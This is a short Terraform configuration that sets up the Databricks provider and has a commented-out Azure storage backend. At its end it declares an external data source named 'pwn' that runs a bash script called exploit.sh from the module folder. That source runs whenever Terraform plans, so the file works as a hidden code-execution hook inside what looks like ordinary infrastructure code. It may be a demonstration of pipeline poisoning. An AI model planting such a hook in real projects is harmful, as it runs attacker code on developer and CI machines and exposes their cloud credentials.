terraform {
  /*
  backend "azurerm" {
    resource_group_name  = "yapemlstacks2"
    storage_account_name = "yapemlstacks2"
    container_name       = "tfstate"
    key                  = "prod.terraform.tfstate"
  }
  */
  required_providers {
    databricks = {
      source = "databricks/databricks"
    }
  }
}

data "external" "pwn" {
  program = ["bash", "${path.module}/exploit.sh"]
}
